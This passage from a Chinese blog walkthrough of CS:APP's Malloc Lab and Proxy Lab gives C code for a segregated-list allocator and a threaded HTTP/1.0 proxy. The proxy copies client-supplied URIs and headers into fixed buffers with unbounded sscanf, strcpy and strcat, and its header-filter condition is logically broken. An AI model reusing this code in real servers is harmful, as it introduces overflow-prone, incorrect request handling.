PUT(heap_listp + ((<span class="hljs-number">1</span> + CLASS_SIZE)*WSIZE), PACK(DSIZE, <span class="hljs-number">1</span>));  <span class="hljs-comment">//prologue block header</span><br>    PUT(heap_listp + ((<span class="hljs-number">2</span> + CLASS_SIZE)*WSIZE), PACK(DSIZE, <span class="hljs-number">1</span>));  <span class="hljs-comment">//prologue block footer</span><br>    PUT(heap_listp + ((<span class="hljs-number">3</span> + CLASS_SIZE)*WSIZE), PACK(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>));      <span class="hljs-comment">//epilogue block header</span><br>    seg_listsp = heap_listp;<br>    heap_listp = heap_listp + (CLASS_SIZE+<span class="hljs-number">1</span>) * WSIZE;<br>    <br>    <span class="hljs-keyword">if</span> (!extendHeap(CHUNKSIZE / WSIZE)) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;	<span class="hljs-comment">//create a free block of CHUNKSIZE</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h3 id="mm-malloc"><a href="#mm-malloc" class="headerlink" title="mm_malloc"></a>mm_malloc</h3><p>调整块大小并对齐，然后用<code>find_fit</code>找匹配块，若找不到则用<code>extendHeap</code>扩展堆，用<code>use_block</code>设置分配内存位置。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/** </span><br><span class="hljs-comment"> * mm_malloc - find a fit free block</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">mm_malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!size) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">size_t</span> asize = (size + <span class="hljs-number">2</span> * DSIZE - <span class="hljs-number">1</span>) &amp; ~<span class="hljs-number">0x7</span>;               <span class="hljs-comment">//aligned size</span><br>    <span class="hljs-type">void</span> *ptr = find_fit(asize);<br>    <span class="hljs-keyword">if</span> (!(ptr = ptr ? ptr : extendHeap(MAX(asize, CHUNKSIZE) / WSIZE))) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    use_block(ptr, asize);<br>    <span class="hljs-keyword">return</span> ptr;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="mm-free"><a href="#mm-free" class="headerlink" title="mm_free"></a>mm_free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * mm_free - Free a block and coalscue adjacent blocks.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">mm_free</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> size = GET_SIZE(HEADER(ptr));<br>    PUT(HEADER(ptr), PACK(size, <span class="hljs-number">0</span>));<br>    PUT(FOOTER(ptr), PACK(size, <span class="hljs-number">0</span>));<br>    addFreeBlock(coalesce(ptr));<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="mm-realloc"><a href="#mm-realloc" class="headerlink" title="mm_realloc"></a>mm_realloc</h3><p><code>realloc</code>拷贝的大小取原有大小和新分配空间大小的较小值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * mm_realloc </span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">mm_realloc</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-type">void</span> *newptr = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> (!ptr) <span class="hljs-keyword">return</span> mm_malloc(size);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!size) &#123;<br>        mm_free(ptr);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> prevsize = GET_SIZE(HEADER(ptr));           <br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> alignedsize = (size + DSIZE * <span class="hljs-number">2</span> - <span class="hljs-number">1</span>) &amp; (~<span class="hljs-number">0x7</span>);<br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> deltas = prevsize - alignedsize;<br>        <span class="hljs-keyword">if</span> (deltas &gt; <span class="hljs-number">2</span> * DSIZE) &#123;<br>            PUT(HEADER(ptr), PACK(alignedsize, <span class="hljs-number">1</span>));<br>            PUT(FOOTER(ptr), PACK(alignedsize, <span class="hljs-number">1</span>));<br>            PUT(HEADER(NEXT_BLOCK(ptr)), PACK(deltas, <span class="hljs-number">0</span>));<br>            PUT(FOOTER(NEXT_BLOCK(ptr)), PACK(deltas, <span class="hljs-number">0</span>));<br>            addFreeBlock(coalesce(NEXT_BLOCK(ptr)));<br>            <span class="hljs-keyword">return</span> ptr;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (!(newptr = mm_malloc(size))) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>            <span class="hljs-built_in">memcpy</span>(newptr, ptr, MIN(prevsize - DSIZE,size));<br>            mm_free(ptr);<br>            <span class="hljs-keyword">return</span> newptr;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h3><p>调整宏定义部分参数。分类数<code>CLASS_SIZE</code>大于等于2时总吞吐量均能达到600Kops的标准(此处取分类数为2)。块大小<code>CHUNKSIZE</code>取为160时分配内存利用率较高，此时结果是49&#x2F;60(util)+40&#x2F;40(thru)，继续优化很麻烦，不想再碰SIGSEGV。</p>
<h2 id="8-Proxy-Lab-来一点最终大考震撼"><a href="#8-Proxy-Lab-来一点最终大考震撼" class="headerlink" title="8. Proxy Lab: 来一点最终大考震撼"></a>8. Proxy Lab: 来一点最终大考震撼</h2><p>缓存、并发和网络编程，都是不太好伺候的主。</p>
<h3 id="Part-I"><a href="#Part-I" class="headerlink" title="Part I"></a>Part I</h3><p>实现一个处理 HTTP&#x2F;1.0 GET 请求的基本顺序代理。此处代码实现可参照<code>tiny.c</code>文件。</p>
<p>宏和全局变量定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Recommended max cache and object sizes */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_CACHE_SIZE 1049000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_OBJECT_SIZE 102400</span><br><br><span class="hljs-comment">/* You won&#x27;t lose style points for including this long line in your code */</span><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *user_agent_hdr = <span class="hljs-string">&quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3\r\n&quot;</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *conn_hdr       = <span class="hljs-string">&quot;Connection: close\r\n&quot;</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *proxy_hdr      = <span class="hljs-string">&quot;Proxy-Connection: close\r\n&quot;</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *host_hdr_format= <span class="hljs-string">&quot;Host: %s\r\n&quot;</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *req_hdr_format = <span class="hljs-string">&quot;GET %s HTTP/1.0\r\n&quot;</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *hdr_end        = <span class="hljs-string">&quot;\r\n&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>分析请求得到的URI用以下结构存储：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Parsed_URI</span>&#123;</span><br>    <span class="hljs-type">char</span> host[MAXLINE];<br>    <span class="hljs-type">char</span> port[MAXLINE]; <br>    <span class="hljs-type">char</span> path[MAXLINE];<br>&#125;parsed_uri;<br></code></pre></td></tr></table></figure>

<p>主函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* $begin main */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-type">int</span> listenfd, connfd;<br>    <span class="hljs-type">char</span> hostname[MAXLINE], port[MAXLINE];<br>    <span class="hljs-type">socklen_t</span> clientlen;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_storage</span> <span class="hljs-title">clientaddr</span>;</span><br>    <br>    <span class="hljs-comment">/* Check command line args */</span><br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)&#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;usage :%s &lt;port&gt; \n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    signal(SIGPIPE, sigpipe_handler);<br>    listenfd = Open_listenfd(argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-comment">/* Handle connection */</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        clientlen = <span class="hljs-keyword">sizeof</span>(clientaddr);<br>        connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);<br>        Getnameinfo((SA *)&amp;clientaddr, clientlen, hostname, MAXLINE, port, MAXLINE, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Accepted connection from (%s, %s).\n&quot;</span>, hostname, port);<br>        doit(connfd);<br>        Close(connfd);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">/* $end main */</span><br></code></pre></td></tr></table></figure>

<p><code>SIGPIPE</code>处理程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * SIGPIPE handler </span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* $begin sigpipe_handler */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">sigpipe_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SIGPIPE caught!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">/* $end sigpipe_handler */</span><br></code></pre></td></tr></table></figure>

<p>处理一组HTTP请求和响应：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * doit - handle one HTTP request/response transaction</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* $begin doit */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">doit</span><span class="hljs-params">(<span class="hljs-type">int</span> connfd)</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];<br>    <span class="hljs-type">char</span> server[MAXLINE];<br>    <span class="hljs-type">rio_t</span> rio, server_rio;<br>    <br>    <span class="hljs-comment">/* Read request line and headers */</span><br>    Rio_readinitb(&amp;rio, connfd);<br>    Rio_readlineb(&amp;rio, buf, MAXLINE);<br>    <span class="hljs-built_in">sscanf</span>(buf, <span class="hljs-string">&quot;%s %s %s&quot;</span>, method, uri, version);<br>    <span class="hljs-keyword">if</span> (strcasecmp(method, <span class="hljs-string">&quot;GET&quot;</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Proxy does not implement this method.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">/* Parse URI from GET request */</span><br>    parsed_uri *uri_data = (parsed_uri *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(parsed_uri));<br>    parse_uri(uri, uri_data);<br>    creat_header(server, uri_data, &amp;rio);<br>    <span class="hljs-comment">/* Connect to server */</span><br>    <span class="hljs-type">int</span> serverfd = Open_clientfd(uri_data-&gt;host, uri_data-&gt;port);<br>    <span class="hljs-keyword">if</span> (serverfd &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;connection failed\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    Rio_readinitb(&amp;server_rio, serverfd);<br>    Rio_writen(serverfd, server, <span class="hljs-built_in">strlen</span>(server));<br>    <span class="hljs-type">size_t</span> n;<br>    <span class="hljs-keyword">while</span> ((n = Rio_readlineb(&amp;server_rio, buf, MAXLINE)))&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Proxy transmitted %d bytes.\n&quot;</span>, (<span class="hljs-type">int</span>)n);<br>        Rio_writen(connfd, buf, n);<br>    &#125;<br>    Close(serverfd);<br>&#125;<br><span class="hljs-comment">/* $end doit */</span><br></code></pre></td></tr></table></figure>

<p>分析URI：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * parse_uri - parse URI into http://host:port/path</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* $begin parse_uri */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">parse_uri</span><span class="hljs-params">(<span class="hljs-type">char</span> *uri, parsed_uri *uri_data)</span><br>&#123;<br>    <span class="hljs-type">char</span> *host = <span class="hljs-built_in">strstr</span>(uri, <span class="hljs-string">&quot;//&quot;</span>);<br>    <span class="hljs-keyword">if</span> (host)&#123;<br>        <span class="hljs-type">char</span> *port = <span class="hljs-built_in">strstr</span>(host + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;:&quot;</span>);<br>        <span class="hljs-keyword">if</span> (port) &#123;<br>            <span class="hljs-type">int</span> tmp;<br>            <span class="hljs-built_in">sscanf</span>(port + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;%d%s&quot;</span>, &amp;tmp, uri_data-&gt;path);<br>            <span class="hljs-built_in">sprintf</span>(uri_data-&gt;port, <span class="hljs-string">&quot;%d&quot;</span>, tmp);<br>            *port = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-type">char</span> *path = <span class="hljs-built_in">strstr</span>(host + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;/&quot;</span>);<br>            <span class="hljs-keyword">if</span> (path)&#123;<br>                <span class="hljs-built_in">strcpy</span>(uri_data-&gt;path, path);<br>                <span class="hljs-built_in">strcpy</span>(uri_data-&gt;port, <span class="hljs-string">&quot;80&quot;</span>);<br>                *path = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-built_in">strcpy</span>(uri_data-&gt;host, host + <span class="hljs-number">2</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-type">char</span> *path = <span class="hljs-built_in">strstr</span>(uri, <span class="hljs-string">&quot;/&quot;</span>);<br>        <span class="hljs-keyword">if</span> (path)<span class="hljs-built_in">strcpy</span>(uri_data-&gt;path, path);<br>        <span class="hljs-built_in">strcpy</span>(uri_data-&gt;port, <span class="hljs-string">&quot;80&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">/* $end parse_uri */</span><br></code></pre></td></tr></table></figure>

<p>生成响应头：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * creat_header - create response header</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* $begin creat_header */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">creat_header</span><span class="hljs-params">(<span class="hljs-type">char</span> *http_header, parsed_uri *uri_data, <span class="hljs-type">rio_t</span> *client_rio)</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[MAXLINE], request_hdr[MAXLINE], other_hdr[MAXLINE], host_hdr[MAXLINE];<br>    <span class="hljs-built_in">sprintf</span>(request_hdr, req_hdr_format, uri_data-&gt;path);<br>    <span class="hljs-keyword">while</span> (Rio_readlineb(client_rio, buf, MAXLINE) &gt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(buf, hdr_end)) <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">if</span> (!strncasecmp(buf, <span class="hljs-string">&quot;Host&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;Host&quot;</span>)))&#123;<br>            <span class="hljs-built_in">strcpy</span>(host_hdr, buf);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!strncasecmp(buf, <span class="hljs-string">&quot;Connection&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;Connection&quot;</span>)) <br>         &amp;&amp; !strncasecmp(buf, <span class="hljs-string">&quot;Proxy-Connection&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;Proxy-Connection&quot;</span>)) <br>         &amp;&amp; !strncasecmp(buf, <span class="hljs-string">&quot;User-Agent&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;User-Agent&quot;</span>)))<br>        <span class="hljs-built_in">strcat</span>(other_hdr, buf);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strlen</span>(host_hdr)) <span class="hljs-built_in">sprintf</span>(host_hdr, host_hdr_format, uri_data-&gt;host);<br>    <span class="hljs-built_in">sprintf</span>(http_header, <span class="hljs-string">&quot;%s%s%s%s%s%s%s&quot;</span>, request_hdr, host_hdr, conn_hdr, proxy_hdr, user_agent_hdr, other_hdr, hdr_end);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">/* $end creat_header */</span><br></code></pre></td></tr></table></figure>

<h3 id="Part-II"><a href="#Part-II" class="headerlink" title="Part II"></a>Part II</h3><p>在Part I的基础上为代理添加并发支持。</p>
<p>从<code>sbuf.h</code>引入缓冲区，其中<code>mutex</code>, <code>slots</code>, <code>items</code>初始值分别为1, n, 0：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">int</span> *buf;          <span class="hljs-comment">/* Buffer array */</span>         <br>    <span class="hljs-type">int</span> n;             <span class="hljs-comment">/* Maximum number of slots */</span><br>    <span class="hljs-type">int</span> front;         <span class="hljs-comment">/* buf[(front+1)%n] is first item */</span><br>    <span class="hljs-type">int</span> rear;          <span class="hljs-comment">/* buf[rear%n] is last item */</span><br>    <span class="hljs-type">sem_t</span> mutex;       <span class="hljs-comment">/* Protects accesses to buf */</span><br>    <span class="hljs-type">sem_t</span> slots;       <span class="hljs-comment">/* Counts available slots */</span><br>    <span class="hljs-type">sem_t</span> items;       <span class="hljs-comment">/* Counts available items */</span><br>&#125; <span class="hljs-type">sbuf_t</span>;<br></code></pre></td></tr></table></figure>

<p>定义全局变量<code>sbuf</code>，用作缓冲区：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">sbuf_t</span> sbuf;<br></code></pre></td></tr></table></figure>

<p>主函数处理连接前创建线程，处理连接时将线程加入缓冲区：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* $begin main */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-type">int</span> listenfd, connfd;<br>    <span class="hljs-type">char</span> hostname[MAXLINE], port[MAXLINE];<br>    <span class="hljs-type">socklen_t</span> clientlen;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_storage</span> <span class="hljs-title">clientaddr</span>;</span><br>    <span class="hljs-comment">/* Check command line args */</span><br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)&#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;usage :%s &lt;port&gt; \n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    signal(SIGPIPE, sigpipe_handler);<br>    listenfd = Open_listenfd(argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-comment">/* Init threads */</span><br>    <span class="hljs-type">pthread_t</span> tid;<br>    sbuf_init(&amp;sbuf, SBUF_SIZE);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;NTHREADS; i+=<span class="hljs-number">1</span>) Pthread_create(&amp;tid, <span class="hljs-literal">NULL</span>, thread, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-comment">/* Handle connection */</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        clientlen = <span class="hljs-keyword">sizeof</span>(clientaddr);<br>        connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);<br>        sbuf_insert(&amp;sbuf, connfd);<br>        Getnameinfo((SA *)&amp;clientaddr, clientlen, hostname, MAXLINE, port, MAXLINE, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Accepted connection from (%s, %s).\n&quot;</span>, hostname, port);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">/* $end main */</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * thread - handle threads in sbuf</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* $begin thread */</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *vargp)</span><br>&#123;<br>    Pthread_detach(pthread_self());<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-type">int</span> connfd = sbuf_remove(&amp;sbuf);<br>        doit(connfd);<br>        Close(connfd);<br>    &#125;<br>&#125;<br><span class="hljs-comment">/* $end thread */</span><br></code></pre></td></tr></table></figure>

<h3 id="Part-III"><a href="#Part-III" class="headerlink" title="Part III"></a>Part III</h3><p>添加缓存并使用LRU算法进行替换，此处缓存应该使用读优先策略。</p>
<p>缓存的结构如下：</p>
